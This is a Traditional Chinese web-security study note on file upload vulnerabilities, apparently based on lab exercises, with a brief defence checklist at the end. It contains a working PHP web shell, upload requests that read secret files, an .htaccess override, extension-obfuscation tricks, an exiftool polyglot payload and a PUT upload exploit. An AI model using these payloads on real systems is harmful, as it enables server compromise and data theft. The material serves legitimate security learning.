# File Upload
## 案例
### Deploy a web shell
```
<?php echo system($_GET['command']); ?>
```
### Content-Type bypass
* 開發人員僅檢查 Content-Type，並未確認內容是否與其一致，因此可以將 Content-Type 換成 `image/jpeg` 或 `image/png`，來達成攻擊。
```
Content-Type: image/jpeg
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### Path traversal bypass
* 開發人員會對使用者上傳的檔案與目錄進行嚴格的檢查，但我們可以透過上傳到其他路徑 ( `../exploit.php` )，來繞過檢查。
```
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### Overriding the server configuration
* 有時候 server 不一定會執行我們上傳的檔案，因為要執行特定檔案需要事先在設定檔中設定，像是如果要在 apache server 執行 php 需要再 `/etc/apache2/apache2.conf` 中設定:
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```
* 然而有時 server 會允許開發者使用特別的設定檔去改寫原本的設定，像是 apache server 中的 `.htaccess`，以及 IIS server 中的 `web.config` 檔案。
* 因此我們可以透過上傳 `.htaccess` 來改寫原本設定，這將任意擴展名 `.l33t` 映射到可執行 MIME 類型 `application/x-httpd-php`
```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .l33t
```
* 之後我們就可以上傳 `exploit.l33t`，來繞過檢查機制。
```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### Obfuscating file extensions
* 給予多個擴展名，`exploit.php.jpg`
* 結尾加入空格或點，`exploit.php.`
* 使用 url 編碼，`exploit%2Ephp`
* 加入分號與空字串編碼，對 C/C++ 將會是結束符號，`exploit.asp;.jpg` 與 `exploit.asp%00.jpg`
* 使用多位元 unicode 編碼，像是 `xC0 x2E`, `xC4 xAE` 或 `xC0 xAE`，對於 utf-8 編碼會是 `x2E`。
* 有時開發人員會去掉不安全的擴展名，因此我們可以透過一些技巧繞過，像是 `exploit.p.phphp`。
```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg
Content-Type: application/x-php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### Flawed validation of the file's contents
* 有時開發人員會檢查檔案的特徵，來確定是否與上傳的格式一致，像是 jpg 檔開頭是否為 `FF D8 FF`。
* 但我們可以透過 `ExifTool` 產生元數據中包含惡意程式的多語言 jpg 檔，像是將我們要注入的程式，寫入 jpg 中的 comment 欄位。
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```
### Exploiting file upload race conditions
* [race conditions 參考資料](https://zhuanlan.zhihu.com/p/403063546)
* race conditions 是多個程式可以同時存取相同資源，而存取到錯誤資訊，導致最終結果錯誤。
* 這邊的情境是，系統會將上傳的檔案先傳到一個暫存的地方，然後檢查是否有問題，如果有問題才移除。
```
move_uploaded_file(target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}
```
* 因此我們在檢查檔案的時間內，我們有機會執行惡意程式。
### Exploiting file upload without remote code execution
#### 上傳客戶端惡意程式
* 透過上傳 html 或 svg，在其中加入惡意 script，來達成像是 stored XSS 攻擊。
#### 利用上傳文件解析中的漏洞
* 我們知道 server 會解析基於 XML 的文件，例如 Microsoft Office .doc 或 .xls 文件，因此我們可能可以透過 XXE 來達成攻擊。
### Uploading files using PUT
* 有些 Web server 可能被配置為支持 `PUT` 請求。
* 因此提供另一種上傳惡意文件的方法，即使上傳功能無法通過 Web 介面。
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
* 我們可以透過 `OPTIONS` 方法，來確認 server 支援的請求方法。
```
curl -X OPTIONS https://example.org -i
```
```
HTTP/1.1 204 No Content
Allow: OPTIONS, GET, HEAD, POST
Cache-Control: max-age=604800
Date: Thu, 13 Oct 2016 11:45:00 GMT
Server: EOS (lax004/2813)
```
## 防禦
* 設定允許擴展名的白名單而不是禁止擴展名的黑名單。
* 確保文件名不包含任何可能被解釋為目錄或遍歷序列 (../) 的子字符串。
* 重命名上傳的文件，以避免現有文件被覆蓋的衝突。
* 在完全驗證之前，不要將文件上傳到服務器的永久文件系統。
* 盡可能使用已建立的框架來預處理文件上傳，而不是嘗試編寫自己的驗證機制。
---
###### tags: `web security`